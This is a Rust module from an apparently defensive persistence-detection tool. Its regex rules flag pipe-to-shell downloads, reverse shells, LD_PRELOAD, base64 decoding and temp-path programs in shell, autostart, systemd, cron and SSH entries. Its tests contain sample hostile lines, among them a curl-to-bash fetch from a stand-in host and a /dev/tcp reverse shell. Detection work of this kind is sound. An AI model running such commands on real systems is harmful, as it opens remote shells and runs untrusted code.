//! Rules that flag suspicious lines in new or changed persistence entries.

use std::sync::LazyLock;

use regex::Regex;
use similar::{ChangeTag, TextDiff};

use crate::model::{Entry, Finding, Kind};

struct Rule {
    id: &'static str,
    re: Regex,
    /// Kinds the rule applies to; empty means all.
    kinds: &'static [Kind],
}

static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    let rule = |id, pattern: &str, kinds| Rule {
        id,
        re: Regex::new(pattern).expect("valid rule regex"),
        kinds,
    };
    vec![
        rule("preload", r"\bLD_(PRELOAD|AUDIT)\b|ld\.so\.preload", &[]),
        rule(
            "pipe-to-shell",
            r"\b(curl|wget|fetch)\b[^|\n]*\|\s*(sudo\s+)?(ba|da|z|k|fi)?sh\b",
            &[],
        ),
        rule(
            "inline-interpreter",
            r"\b(python[0-9.]*|perl|ruby|php|node)\s+-[ce]\b",
            &[],
        ),
        rule(
            "base64",
            r"\bbase64\s+(-d|--decode|-D)\b|[A-Za-z0-9+/]{100,}={0,2}",
            &[],
        ),
        rule(
            "temp-path",
            r#"(^|[\s='":;])(/tmp|/var/tmp|/dev/shm)/|(~|\$HOME|\$\{HOME\})/\.cache/"#,
            &[],
        ),
        rule(
            "reverse-shell",
            r"/dev/(tcp|udp)/|\bnc(at)?\b[^\n]*\s-[a-zA-Z]*e\b|\bsocat\b[^\n]*\bexec\b|\bbash\s+-i\b|\bmkfifo\b",
            &[],
        ),
        rule(
            "background",
            r"\b(nohup|disown|setsid)\b",
            &[Kind::ShellRc, Kind::Session, Kind::Environment],
        ),
        rule(
            "make-executable",
            r"\bchmod\b[^\n]*\+x\b|\bchmod\s+[0-7]?[0-7][1357][0-7]\b",
            &[],
        ),
        rule(
            "forced-command",
            r#"(^|,)\s*(command|environment)=""#,
            &[Kind::Ssh],
        ),
    ]
});

/// Rules that on their own mark a change as dangerous enough for a question. The other rules
/// also match plenty of harmless setups and only lead to a warning.
const STRONG_RULES: &[&str] = &[
    "preload",
    "pipe-to-shell",
    "reverse-shell",
    "forced-command",
    crate::scanner::MALWARE_RULE,
];

/// Kinds that start programs on their own, where a path in a temporary folder means a
/// program is started from there.
const STARTERS: &[Kind] = &[
    Kind::Autostart,
    Kind::SystemdUser,
    Kind::SystemdSystem,
    Kind::Crontab,
];

/// Whether `findings` in an entry of `kind` should interrupt the person with a question.
pub fn alarming(kind: Kind, findings: &[Finding]) -> bool {
    findings.iter().any(|f| {
        STRONG_RULES.contains(&f.rule.as_str())
            || (f.rule == "temp-path" && STARTERS.contains(&kind))
    })
}

/// Whether a change of `kind` without findings may be accepted with only a hint. A new SSH
/// key, sudo rule or library path gives no pattern to match and is rare on a desktop, so it
/// always waits for a decision.
pub fn may_note(kind: Kind) -> bool {
    !matches!(kind, Kind::Ssh | Kind::Privileges | Kind::Preload)
}

/// Lines in `exec_key=` style keys of desktop entries and systemd units.
static EXEC_LINE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^\s*(Exec|TryExec|ExecStart|ExecStartPre|ExecStartPost|ExecStop|ExecReload)\s*=\s*(.*)$",
    )
    .expect("valid regex")
});

/// Lines added in `new` compared with `old`. For a new entry all lines count as added.
pub fn added_lines(old: Option<&Entry>, new: &Entry) -> Vec<String> {
    let Some(new_text) = new.text() else {
        return Vec::new();
    };
    let old_text = old.and_then(Entry::text).unwrap_or("");
    TextDiff::from_lines(old_text, new_text)
        .iter_all_changes()
        .filter(|c| c.tag() == ChangeTag::Insert)
        .map(|c| c.value().trim_end_matches(['\n', '\r']).to_string())
        .filter(|l| !l.trim().is_empty())
        .collect()
}

/// Check the given lines (and, for symlinks, the link target) against all rules.
pub fn findings(kind: Kind, new: &Entry, lines: &[String]) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut push = |rule: &str, line: &str| {
        let line = line.trim().chars().take(300).collect::<String>();
        if !out
            .iter()
            .any(|f: &Finding| f.rule == rule && f.line == line)
        {
            out.push(Finding {
                rule: rule.to_string(),
                line,
            });
        }
    };

    if let Entry::Symlink { target, .. } = new {
        for rule in RULES.iter() {
            if rule.id == "temp-path" && rule.re.is_match(&format!(" {target}")) {
                push(rule.id, target);
            }
        }
    }
    if let Entry::File { content, .. } = new
        && content.is_some()
        && new.text().is_none()
    {
        push("binary", "");
    }

    for line in lines {
        let trimmed = line.trim_start();
        if trimmed.starts_with('#') && kind != Kind::Ssh {
            continue;
        }
        for rule in RULES.iter() {
            if (rule.kinds.is_empty() || rule.kinds.contains(&kind)) && rule.re.is_match(line) {
                push(rule.id, line);
            }
        }
        if let Some(caps) = EXEC_LINE.captures(line)
            && command_in_hidden_dir(&caps[2])
        {
            push("hidden-dir", line);
        }
    }
    out
}

/// True if the program of a command line lives below a hidden directory other than the usual
/// `.local` and `.config`, such as `~/.x/miner`.
fn command_in_hidden_dir(cmdline: &str) -> bool {
    let program = cmdline
        .trim_start_matches(['-', '@', '!', '+', ':'])
        .split_whitespace()
        .next()
        .unwrap_or("")
        .trim_matches(['"', '\'']);
    let mut components: Vec<&str> = program.split('/').collect();
    components.pop(); // the file name itself may be hidden without meaning much
    components
        .iter()
        .any(|c| c.starts_with('.') && !matches!(*c, "." | ".." | ".local" | ".config"))
}

/// Programs started by `Exec=` / `ExecStart=` style lines, with `%h`, `~` and `$HOME` expanded.
/// Only absolute paths are returned; bare command names are left to `PATH`.
pub fn referenced_programs(entry: &Entry, home: &std::path::Path) -> Vec<std::path::PathBuf> {
    let Some(text) = entry.text() else {
        return Vec::new();
    };
    let home = home.to_string_lossy();
    let mut out = Vec::new();
    for line in text.lines() {
        let Some(caps) = EXEC_LINE.captures(line) else {
            continue;
        };
        let program = caps[2]
            .trim_start_matches(['-', '@', '!', '+', ':'])
            .split_whitespace()
            .next()
            .unwrap_or("")
            .trim_matches(['"', '\'']);
        let expanded = if let Some(rest) = program.strip_prefix("%h") {
            format!("{home}{rest}")
        } else if let Some(rest) = program.strip_prefix("~/") {
            format!("{home}/{rest}")
        } else if let Some(rest) = program
            .strip_prefix("$HOME")
            .or_else(|| program.strip_prefix("${HOME}"))
        {
            format!("{home}{rest}")
        } else {
            program.to_string()
        };
        let path = std::path::PathBuf::from(expanded);
        if path.is_absolute() && !out.contains(&path) {
            out.push(path);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::targets::entry_from_bytes;

    fn rules_for(kind: Kind, old: Option<&str>, new: &str) -> Vec<String> {
        let old = old.map(|o| entry_from_bytes(o.as_bytes().to_vec(), 0o644));
        let new = entry_from_bytes(new.as_bytes().to_vec(), 0o644);
        let lines = added_lines(old.as_ref(), &new);
        findings(kind, &new, &lines)
            .into_iter()
            .map(|f| f.rule)
            .collect()
    }

    #[test]
    fn only_added_lines_count() {
        let old = "alias ll='ls -l'\nexport LD_PRELOAD=/opt/legit.so\n";
        let new = format!("{old}export PATH=$HOME/bin:$PATH\n");
        assert!(rules_for(Kind::ShellRc, Some(old), &new).is_empty());
    }

    #[test]
    fn flags_typical_persistence() {
        let r = rules_for(
            Kind::ShellRc,
            Some(""),
            "curl -s http://x.example/a | bash\n",
        );
        assert_eq!(r, ["pipe-to-shell"]);
        let r = rules_for(Kind::ShellRc, None, "export LD_PRELOAD=/tmp/.x/libx.so\n");
        assert!(r.contains(&"preload".to_string()) && r.contains(&"temp-path".to_string()));
        let r = rules_for(
            Kind::ShellRc,
            None,
            "nohup bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &\n",
        );
        assert!(r.contains(&"reverse-shell".to_string()));
        assert!(r.contains(&"background".to_string()));
        let r = rules_for(
            Kind::Autostart,
            None,
            "[Desktop Entry]\nType=Application\nExec=/home/u/.cache/.sys/kworker --quiet\n",
        );
        assert_eq!(r, ["hidden-dir"]);
        let r = rules_for(
            Kind::Ssh,
            None,
            "command=\"/bin/sh -c id\" ssh-ed25519 AAAA test\n",
        );
        assert_eq!(r, ["forced-command"]);
    }

    #[test]
    fn ignores_harmless_entries() {
        let desktop = "[Desktop Entry]\nType=Application\nExec=/usr/bin/nextcloud --background\nX-GNOME-Autostart-enabled=true\n";
        assert!(rules_for(Kind::Autostart, None, desktop).is_empty());
        let unit = "[Service]\nExecStart=%h/.local/bin/syncthing serve\n";
        assert!(rules_for(Kind::SystemdUser, None, unit).is_empty());
        let rc = "# curl x | sh in a comment\nexport EDITOR=vim\n";
        assert!(rules_for(Kind::ShellRc, None, rc).is_empty());
    }

    #[test]
    fn symlink_into_tmp() {
        let link = Entry::Symlink {
            hash: "link:x".into(),
            target: "/tmp/evil.service".into(),
        };
        let r = findings(Kind::SystemdUser, &link, &[]);
        assert_eq!(r[0].rule, "temp-path");
    }
}
